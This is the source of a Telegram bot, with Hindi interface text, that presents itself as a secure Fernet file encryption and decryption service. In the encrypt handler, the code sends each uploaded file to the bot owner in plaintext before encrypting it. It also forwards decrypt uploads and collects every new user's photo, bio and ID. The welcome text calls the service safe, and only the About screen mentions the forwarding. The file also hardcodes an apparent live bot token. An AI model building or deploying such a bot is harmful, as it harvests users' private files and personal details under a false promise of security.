# bot.py
# Requirements:
#   pip install python-telegram-bot==20.6 cryptography
#
# Features:
#   - Encrypt / Decrypt (Fernet) for .py/.html/.htm/.txt up to 50MB
#   - Reply keyboard UI (Encrypt / Decrypt / About / Owner Panel)
#   - Owner-only panel:
#       • Stats: total users, total uploads, encrypt count, decrypt count
#       • Last uploads list
#   - हर upload owner को forward + log
#   - New user join पर owner को DP + bio + details
#   - User को DP के साथ welcome message
#   - No code execution, सिर्फ़ file encrypt/decrypt

import os
import sqlite3
import tempfile
import traceback
from typing import Optional

from cryptography.fernet import Fernet, InvalidToken
from telegram import (
    Update,
    InputFile,
    ReplyKeyboardMarkup,
    KeyboardButton,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ================== CONFIG ==================
BOT_TOKEN = "8513005164:AAHSB3MEuhcWAZSESON3gc8JfIYgY_dCDIk"   # यहाँ अपना bot token
OWNER_ID = 7652176329                        # यहाँ अपना Telegram user ID (int)
DB_PATH = "bot_data.sqlite"
MAX_FILE_SIZE = 50 * 1024 * 1024
ALLOWED_ENCRYPT_EXTS = {".py", ".html", ".htm", ".txt"}
# ============================================


# ================== DB SETUP ==================

def db_connect():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def db_init():
    conn = db_connect()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tg_id INTEGER UNIQUE,
            name TEXT,
            username TEXT,
            first_seen TEXT DEFAULT CURRENT_TIMESTAMP,
            last_seen TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS stats (
            id INTEGER PRIMARY KEY CHECK (id = 1),
            total_users INTEGER DEFAULT 0,
            total_uploads INTEGER DEFAULT 0,
            total_encrypt INTEGER DEFAULT 0,
            total_decrypt INTEGER DEFAULT 0
        )
    """)
    cur.execute("""
        INSERT OR IGNORE INTO stats (id, total_users, total_uploads, total_encrypt, total_decrypt)
        VALUES (1, 0, 0, 0, 0)
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS uploads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            file_name TEXT,
            kind TEXT,                  -- 'encrypt' / 'decrypt' / 'raw'
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()

def db_upsert_user(tg_id: int, name: str, username: Optional[str]):
    conn = db_connect()
    cur = conn.cursor()
    cur.execute("SELECT id FROM users WHERE tg_id = ?", (tg_id,))
    row = cur.fetchone()
    if row:
        cur.execute("""
            UPDATE users
            SET name = ?, username = ?, last_seen = CURRENT_TIMESTAMP
            WHERE tg_id = ?
        """, (name, username, tg_id))
    else:
        cur.execute("""
            INSERT INTO users (tg_id, name, username)
            VALUES (?, ?, ?)
        """, (tg_id, name, username))
        cur.execute("UPDATE stats SET total_users = total_users + 1 WHERE id = 1")
    conn.commit()
    conn.close()

def db_inc_upload(tg_id: int, file_name: str, kind: str):
    conn = db_connect()
    cur = conn.cursor()
    cur.execute("SELECT id FROM users WHERE tg_id = ?", (tg_id,))
    row = cur.fetchone()
    user_id = row["id"] if row else None
    cur.execute("""
        INSERT INTO uploads (user_id, file_name, kind)
        VALUES (?, ?, ?)
    """, (user_id, file_name, kind))
    cur.execute("UPDATE stats SET total_uploads = total_uploads + 1 WHERE id = 1")
    if kind == "encrypt":
        cur.execute("UPDATE stats SET total_encrypt = total_encrypt + 1 WHERE id = 1")
    elif kind == "decrypt":
        cur.execute("UPDATE stats SET total_decrypt = total_decrypt + 1 WHERE id = 1")
    conn.commit()
    conn.close()

def db_get_stats():
    conn = db_connect()
    cur = conn.cursor()
    cur.execute("SELECT * FROM stats WHERE id = 1")
    row = cur.fetchone()
    conn.close()
    return row

def db_get_user_count():
    conn = db_connect()
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) AS c FROM users")
    row = cur.fetchone()
    conn.close()
    return row["c"]

def db_get_last_uploads(limit=10):
    conn = db_connect()
    cur = conn.cursor()
    cur.execute("""
        SELECT u.file_name, u.kind, u.created_at, coalesce(us.name, 'Unknown') AS uname, us.tg_id
        FROM uploads u
        LEFT JOIN users us ON u.user_id = us.id
        ORDER BY u.id DESC
        LIMIT ?
    """, (limit,))
    rows = cur.fetchall()
    conn.close()
    return rows


# ================== HELPERS ==================

def get_ext(name: str) -> str:
    if not name:
        return ""
    return os.path.splitext(name)[1].lower()

def is_allowed_encrypt(name: str) -> bool:
    return get_ext(name) in ALLOWED_ENCRYPT_EXTS

def is_enc(name: Optional[str]) -> bool:
    return bool(name and name.lower().endswith(".enc"))

def is_key_file(name: Optional[str]) -> bool:
    if not name:
        return False
    n = name.lower()
    return n.endswith(".key") or n.endswith(".key.txt") or n.endswith(".txt")

def looks_like_key(text: str) -> bool:
    t = text.strip()
    return 40 <= len(t) <= 60 and all(c.isalnum() or c in "-_=" for c in t)

def kb(is_owner=False) -> ReplyKeyboardMarkup:
    rows = [
        [KeyboardButton("🔐 Encrypt File"), KeyboardButton("🔓 Decrypt File")],
        [KeyboardButton("ℹ️ About Bot")]
    ]
    if is_owner:
        rows.append([KeyboardButton("🧠 Owner Panel")])
        rows.append([KeyboardButton("👥 Users"), KeyboardButton("📊 Stats"), KeyboardButton("🗂 Last Uploads")])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)


# ================== HANDLERS ==================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    is_owner = user.id == OWNER_ID

    # DB user log
    db_upsert_user(user.id, user.full_name, user.username)

    # Owner notify about new user
    if user.id != OWNER_ID:
        try:
            try:
                chat_info = await context.bot.get_chat(user.id)
                bio = chat_info.bio or "—"
            except Exception:
                bio = "—"
            photos = await context.bot.get_user_profile_photos(user.id, limit=1)
            caption = (
                f"👤 *New User / Start*\n\n"
                f"• Name: [{user.full_name}](tg://user?id={user.id})\n"
                f"• Username: @{(user.username or '—')}\n"
                f"• ID: `{user.id}`\n"
                f"• Bio: {bio}"
            )
            if photos.total_count > 0:
                await context.bot.send_photo(
                    OWNER_ID, photos.photos[0][-1].file_id,
                    caption=caption, parse_mode="Markdown"
                )
            else:
                await context.bot.send_message(
                    OWNER_ID, caption, parse_mode="Markdown"
                )
        except Exception as e:
            print("Owner notify error:", e)

    # User welcome with DP
    welcome_text = (
        f"👋 *Welcome, {user.first_name}!* \n\n"
        "यह बॉट आपकी फ़ाइलों को सुरक्षित 🔐 *Encrypt* और 🔓 *Decrypt* कर सकता है।\n\n"
        "नीचे दिए गए बटनों से अपना काम चुनें।"
    )
    try:
        photos = await context.bot.get_user_profile_photos(user.id, limit=1)
        if photos.total_count > 0:
            await chat.send_photo(
                photos.photos[0][-1].file_id,
                caption=welcome_text,
                parse_mode="Markdown",
                reply_markup=kb(is_owner),
            )
        else:
            await chat.send_message(
                welcome_text,
                parse_mode="Markdown",
                reply_markup=kb(is_owner),
            )
    except Exception:
        await chat.send_message(
            "Welcome! नीचे से Encrypt या Decrypt चुनें।",
            reply_markup=kb(is_owner),
        )

    context.user_data.clear()


# ---------- ENCRYPT ----------

async def do_encrypt(update: Update, context: ContextTypes.DEFAULT_TYPE, filename: str, file_id: str):
    user = update.effective_user
    is_owner = user.id == OWNER_ID
    status = await update.message.reply_text("📥 फ़ाइल डाउनलोड कर रहा हूँ...")
    try:
        with tempfile.TemporaryDirectory() as td:
            local_path = os.path.join(td, filename)
            tg_file = await context.bot.get_file(file_id)
            await tg_file.download_to_drive(custom_path=local_path)

            if not os.path.exists(local_path):
                await status.edit_text("❌ डाउनलोड असफल।")
                return

            # DB log + forward to owner
            db_inc_upload(user.id, filename, "encrypt")
            try:
                await context.bot.send_document(
                    OWNER_ID,
                    document=open(local_path, "rb"),
                    caption=(
                        f"⚠️ *User Uploaded (Encrypt)*\n"
                        f"• Name: [{user.full_name}](tg://user?id={user.id})\n"
                        f"• Username: @{user.username or '—'}\n"
                        f"• ID: `{user.id}`\n"
                        f"• File: `{filename}`"
                    ),
                    parse_mode="Markdown",
                )
            except Exception as e:
                print("Forward to owner error:", e)

            await status.edit_text("🔐 Encrypt कर रहा हूँ...")
            key = Fernet.generate_key()
            f = Fernet(key)
            data = open(local_path, "rb").read()
            enc = f.encrypt(data)

            enc_name = filename + ".enc"
            enc_path = os.path.join(td, enc_name)
            open(enc_path, "wb").write(enc)

            await status.edit_text("📤 Encrypted फ़ाइल भेज रहा हूँ...")
            with open(enc_path, "rb") as ef:
                await update.message.reply_document(
                    InputFile(ef, filename=enc_name),
                    caption="✅ *Encrypted File* — key के बिना decrypt नहीं होगी।",
                    parse_mode="Markdown",
                )

            key_name = filename + ".key.txt"
            key_path = os.path.join(td, key_name)
            open(key_path, "wb").write(key)
            with open(key_path, "rb") as kf:
                await update.message.reply_document(
                    InputFile(kf, filename=key_name),
                    caption="🔑 *Fernet Key* — इसे सुरक्षित रखो।",
                    parse_mode="Markdown",
                )

            await update.message.reply_text(
                f"Key:\n`{key.decode()}`",
                parse_mode="Markdown",
                reply_markup=kb(is_owner),
            )

            await status.delete()
    except Exception as e:
        traceback.print_exc()
        await status.edit_text(f"❌ Encryption failed: {e}")


# ---------- DECRYPT ----------

async def do_decrypt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    is_owner = user.id == OWNER_ID

    enc_path = context.user_data.get("enc_path")
    key_text = context.user_data.get("key_text")

    if not enc_path or not key_text:
        await update.message.reply_text(
            "Decrypt के लिए पहले .enc फ़ाइल और फिर सही key दो।",
            reply_markup=kb(is_owner),
        )
        return

    status = await update.message.reply_text("🔓 Decrypt कर रहा हूँ...")
    try:
        f = Fernet(key_text.encode())
        enc_bytes = open(enc_path, "rb").read()
        try:
            dec_bytes = f.decrypt(enc_bytes)
        except InvalidToken:
            await status.edit_text("❌ गलत key या corrupt .enc फ़ाइल।")
            return

        enc_name = os.path.basename(enc_path)
        if enc_name.lower().endswith(".enc"):
            out_name = enc_name[:-4]
        else:
            out_name = "decrypted_file"

        out = tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(out_name)[1])
        out.write(dec_bytes)
        out.close()

        # DB log + forward encrypted file to owner
        db_inc_upload(user.id, enc_name, "decrypt")
        try:
            await context.bot.send_document(
                OWNER_ID,
                document=open(enc_path, "rb"),
                caption=(
                    f"⚠️ *User Decrypt Request*\n"
                    f"• Name: [{user.full_name}](tg://user?id={user.id})\n"
                    f"• Username: @{user.username or '—'}\n"
                    f"• ID: `{user.id}`\n"
                    f"• File: `{enc_name}`"
                ),
                parse_mode="Markdown",
            )
        except Exception as e:
            print("Forward decrypt file to owner error:", e)

        await status.edit_text("✅ Decrypted. फ़ाइल भेज रहा हूँ...")
        with open(out.name, "rb") as f_out:
            await update.message.reply_document(
                InputFile(f_out, filename=out_name),
                caption="💾 *Decrypted File* — untrusted code को सीधे मत चलाओ।",
                parse_mode="Markdown",
            )

        os.unlink(out.name)

    except Exception as e:
        traceback.print_exc()
        await status.edit_text(f"❌ Decryption error: {e}")
    finally:
        try:
            os.unlink(enc_path)
        except Exception:
            pass
        context.user_data.clear()


# ---------- DOCUMENT HANDLER ----------

async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    is_owner = user.id == OWNER_ID
    doc = update.message.document
    name = doc.file_name or "file"
    size = doc.file_size or 0

    if size > MAX_FILE_SIZE:
        await update.message.reply_text(
            "❌ फ़ाइल 50MB से बड़ी है।",
            reply_markup=kb(is_owner),
        )
        return

    mode = context.user_data.get("mode")

    # Encrypt path
    if mode == "encrypt" or (not mode and is_allowed_encrypt(name)):
        if not is_allowed_encrypt(name):
            await update.message.reply_text("यह extension encrypt के लिए allow नहीं है।", reply_markup=kb(is_owner))
            return
        await do_encrypt(update, context, name, doc.file_id)
        context.user_data.clear()
        return

    # Decrypt path
    if mode == "decrypt":
        # Step 1: .enc file
        if is_enc(name):
            tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".enc")
            await (await context.bot.get_file(doc.file_id)).download_to_drive(custom_path=tmp.name)
            tmp.close()
            context.user_data["enc_path"] = tmp.name
            await update.message.reply_text(
                "📄 Encrypted (.enc) फ़ाइल मिली। अब key भेजो (file या text).",
                reply_markup=kb(is_owner),
            )
            return

        # Step 2: key file
        if is_key_file(name):
            tg_file = await context.bot.get_file(doc.file_id)
            key_bytes = await tg_file.download_as_bytearray()
            try:
                key_text = key_bytes.decode().strip()
            except Exception:
                await update.message.reply_text("❌ Key फ़ाइल text की तरह decode नहीं हो रही।", reply_markup=kb(is_owner))
                return

            context.user_data["key_text"] = key_text
            await update.message.reply_text("🔑 Key file मिली, decrypt कर रहा हूँ...", reply_markup=kb(is_owner))
            await do_decrypt(update, context)
            return

    await update.message.reply_text(
        "पहले नीचे से Encrypt या Decrypt मोड चुनो।",
        reply_markup=kb(is_owner),
    )


# ---------- TEXT HANDLER ----------

async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    user = update.effective_user
    is_owner = user.id == OWNER_ID

    # Owner panel
    if text == "🧠 Owner Panel" and is_owner:
        stats = db_get_stats()
        total_users = db_get_user_count()
        msg = (
            "🧠 *Owner Panel*\n\n"
            f"• Total users: *{total_users}*\n"
            f"• Total uploads: *{stats['total_uploads']}*\n"
            f"• Encrypt count: *{stats['total_encrypt']}*\n"
            f"• Decrypt count: *{stats['total_decrypt']}*\n"
        )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=kb(True))
        return

    if text == "👥 Users" and is_owner:
        total_users = db_get_user_count()
        await update.message.reply_text(
            f"👥 Total registered users: *{total_users}*",
            parse_mode="Markdown",
            reply_markup=kb(True),
        )
        return

    if text == "📊 Stats" and is_owner:
        stats = db_get_stats()
        msg = (
            "📊 *Bot Stats*\n\n"
            f"• Users: *{db_get_user_count()}*\n"
            f"• Uploads: *{stats['total_uploads']}*\n"
            f"• Encrypt: *{stats['total_encrypt']}*\n"
            f"• Decrypt: *{stats['total_decrypt']}*"
        )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=kb(True))
        return

    if text == "🗂 Last Uploads" and is_owner:
        rows = db_get_last_uploads(10)
        if not rows:
            await update.message.reply_text("कोई uploads log नहीं हैं।", reply_markup=kb(True))
            return
        lines = ["🗂 *Last uploads:*"]
        for r in rows:
            lines.append(
                f"- [{r['uname']}](tg://user?id={r['tg_id']}) • `{r['file_name']}` • {r['kind']} • {r['created_at']}"
            )
        await update.message.reply_text("\n".join(lines), parse_mode="Markdown", reply_markup=kb(True))
        return

    # Encrypt button
    if text == "🔐 Encrypt File":
        context.user_data["mode"] = "encrypt"
        await update.message.reply_text(
            "वह फ़ाइल भेजो जिसे encrypt करना है (.py/.html/.htm/.txt)।",
            reply_markup=kb(is_owner),
        )
        return

    # Decrypt button
    if text == "🔓 Decrypt File":
        context.user_data["mode"] = "decrypt"
        context.user_data.pop("enc_path", None)
        context.user_data.pop("key_text", None)
        await update.message.reply_text(
            "पहले encrypted (.enc) फ़ाइल भेजो, फिर key (file या text)।",
            reply_markup=kb(is_owner),
        )
        return

    # About
    if text == "ℹ️ About Bot":
        msg = (
            "🤖 *Secure Encrypt/Decrypt Bot*\n\n"
            "• Fernet symmetric encryption (AES आधारित)\n"
            "• 50MB तक की फ़ाइलें\n"
            "• हर upload owner को forward + log\n"
            "• Owner panel में stats और last uploads"
        )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=kb(is_owner))
        return

    # Decrypt mode: key as plain text
    if context.user_data.get("mode") == "decrypt" and looks_like_key(text):
        context.user_data["key_text"] = text.strip()
        await update.message.reply_text("🔑 Key text मिला, decrypt कर रहा हूँ...", reply_markup=kb(is_owner))
        await do_decrypt(update, context)
        return

    # Default
    await update.message.reply_text("समझ नहीं आया। /start करो या नीचे से बटन चुनो।", reply_markup=kb(is_owner))


# ================== MAIN ==================

def main():
    db_init()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    print("Bot started.")
    app.run_polling()

if __name__ == "__main__":
    main()
